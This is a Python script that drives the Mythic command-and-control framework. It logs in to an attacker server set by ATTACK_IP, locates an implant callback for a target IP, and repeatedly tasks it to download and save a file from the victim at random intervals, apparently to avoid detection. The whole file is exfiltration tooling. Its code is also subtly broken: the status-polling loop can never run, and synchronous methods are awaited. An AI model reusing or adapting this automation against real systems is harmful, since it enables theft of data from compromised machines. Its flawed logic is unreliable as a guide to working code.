'''
 # @ Author: Newt Tan
 # @ Create Time: 2025-01-04 12:44:57
 # @ Modified by: Newt Tan
 # @ Modified time: 2025-01-04 12:46:37
 # @ Description: automatically send back extracted data
 '''


from mythic import mythic
from dotenv import load_dotenv
from pathlib import Path
import os
from utils import util
import time
import random
import asyncio

dotenv_path = Path.cwd().joinpath('.env').as_posix()

load_dotenv(dotenv_path)

random.seed(43)

# when move to custom place, need to change the path to locate logs folder
logger = util.create_logger(Path.cwd().parent.parent.joinpath("logs", Path(__file__).name))


class MythicHelper:
    def __init__(self,):
        self.mythic = None
    
    async def async_init(self):
        self.mythic = await mythic.login(
                    username=os.environ.get("USERNAME"),
                    password=os.environ.get("PASSWORD"),
                    server_ip=os.environ.get("ATTACK_IP"),
                    server_port=7443,
                    timeout=-1,
                    ssl=True
                )

    def locate_callback(self, match_key, match_value):
        ''' automatically locate the callback by matching specific key-value pairs

        :param match_key: attribute to match (e.g 'id' 'domain' 'ip')
        :param match_value: vlaue to match for the attribute
        :return: callback dictionary or None if not found
        
        '''
        callbacks = self.mythic.get_all_callbacks()
        print(callbacks)
        for callback in callbacks:
            print(callback)
            if callback.get(match_key) == match_value:
                logger.info(f"Found callback: {callback}")
                return callback
        
        logger.info(f"No callback matching {match_key} = {match_value} found.")
        return None


    def down_send_file(self, callback_id, file_path, min_interval=60, max_interval=7200):
        ''' periodically send a command to download a specific file from the target

        :param callback_id: Id of the callback to task
        :param file_path: Path to the file to download
        '''
        while True:
            try:
                task = self.mythic.create_task(callback_id, command="download", params=file_path)
                logger.info(f"Task sent for downloading {file_path}. Task ID: {task['id']}")

                # monitor task results
                task_status = None
                while task_status in ["completed", 'error']:
                    task_info = self.mythic.get_task_status(task['id'])
                    task_status = task_info.get("status", "unknown")
                    logger.info(f"Task {task['id']} status: {task_status}")

                    if task_status == "completed":
                        # save downloaded file
                        file_id = task_info['response'].get("file_id")
                        if file_id:
                            file_content = self.mythic.download_file(file_id)
                            with open(Path(file_path).name, 'wb') as fw:
                                fw.write(file_content)
                            logger.info(f"File {file_path} successfully downloaded. ")
                        break
                    elif task_status == "error":
                        logger.warn(f"Task {task['id']} encountered an error.")
                        break
                    else:
                        # wait before polling again
                        time.sleep(10)
                
                # wait for a random interval before reissuing the task
                wait_time = random.randint(min_interval, max_interval)
                logger.info(f"Waiting for {wait_time} seconds before issuing the next download")
                time.sleep(wait_time)
            
            except Exception as e:
                logger.warn(f"An error occurred during download process: {e}")
                pass
                    
async def main():
    helper = MythicHelper()
    await helper.async_init()  # Initialize and log in

    hostname = "10.0.0.5"
    # Locate callback by hostname
    callback = await helper.locate_callback("IP", hostname)
    if callback:
        callback_id = callback['id']
        # Default saved location --- current folder
        file_path = Path.cwd().joinpath("system.json")
        await helper.down_send_file(callback_id, file_path, min_interval=120, max_interval=3600)


if __name__ == "__main__":
    asyncio.run(main())
